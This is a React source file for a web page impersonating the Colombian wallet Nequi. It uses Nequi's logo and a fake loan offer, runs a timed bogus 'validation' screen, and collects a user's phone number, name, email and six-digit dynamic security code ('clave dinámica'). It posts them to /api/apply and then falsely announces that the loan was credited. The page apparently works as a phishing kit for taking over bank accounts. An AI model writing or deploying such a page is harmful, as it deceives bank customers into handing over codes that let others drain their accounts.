import React, { useState } from 'react'
import { motion, AnimatePresence } from 'framer-motion'

export default function App() {
  const [screen, setScreen] = useState('login')
  const [phone, setPhone] = useState('')
  const [form, setForm] = useState({ name: '', email: '', amount: '', term: '', clave: '' })

  const handleContinue = () => {
    if (!phone) return alert('Por favor ingresa tu número.')
    setScreen('validating')
    setTimeout(() => setScreen('form'), 2500)
  }

  const handleSubmit = async (e) => {
    e.preventDefault()
    const res = await fetch('/api/apply', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ...form, phone })
    })
    if (res.ok) {
      setScreen('success')
      setTimeout(() => setScreen('splash'), 11000)
    }
  }

  return (
    <div className="flex items-center justify-center h-screen text-center">
      <AnimatePresence mode="wait">
        {screen === 'login' && (
          <motion.div
            key="login"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.6 }}
            className="flex flex-col items-center"
          >
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Nequi_logo.svg" alt="logo" className="w-24 mb-8" />
            <h2 className="text-lg mb-2">Ingresa tu número de teléfono</h2>
            <div className="flex bg-white/20 rounded-xl px-4 py-2 mb-4">
              <span className="text-white mr-2">+57</span>
              <input
                className="bg-transparent outline-none text-white w-40"
                placeholder="Número"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
              />
            </div>
            <button onClick={handleContinue} className="bg-white text-purple-700 px-6 py-2 rounded-full font-bold">
              Continuar
            </button>
          </motion.div>
        )}

        {screen === 'validating' && (
          <motion.div key="validating" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
            <p className="text-xl font-semibold animate-pulse">Validando acceso para reclamar tu préstamo...</p>
          </motion.div>
        )}

        {screen === 'form' && (
          <motion.form
            key="form"
            onSubmit={handleSubmit}
            initial={{ opacity: 0, y: 40 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.6 }}
            className="flex flex-col space-y-3 bg-white/20 p-6 rounded-2xl"
          >
            <input required placeholder="Nombre completo" className="p-2 rounded text-black" onChange={(e) => setForm({ ...form, name: e.target.value })} />
            <input required type="email" placeholder="Correo" className="p-2 rounded text-black" onChange={(e) => setForm({ ...form, email: e.target.value })} />
            <input required type="number" placeholder="Monto" className="p-2 rounded text-black" onChange={(e) => setForm({ ...form, amount: e.target.value })} />
            <input required placeholder="Plazo (meses)" className="p-2 rounded text-black" onChange={(e) => setForm({ ...form, term: e.target.value })} />
            <input required maxLength="6" placeholder="Clave dinámica (6 dígitos)" className="p-2 rounded text-black text-center" onChange={(e) => setForm({ ...form, clave: e.target.value })} />
            <button type="submit" className="bg-white text-purple-700 px-6 py-2 rounded-full font-bold">Enviar solicitud</button>
          </motion.form>
        )}

        {screen === 'success' && (
          <motion.div key="success" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
            <div className="flex flex-col items-center">
              <motion.div
                animate={{ scale: [1, 1.2, 1] }}
                transition={{ repeat: Infinity, duration: 1.5 }}
                className="bg-white text-purple-700 rounded-full p-6 mb-4"
              >
                ✓
              </motion.div>
              <h2 className="text-2xl font-bold mb-2">Préstamo reclamado con éxito</h2>
              <p>En unos minutos se reflejará en tu cuenta.</p>
            </div>
          </motion.div>
        )}

        {screen === 'splash' && (
          <motion.div key="splash" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col items-center">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Nequi_logo.svg" alt="logo" className="w-24 animate-pulse" />
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  )
}
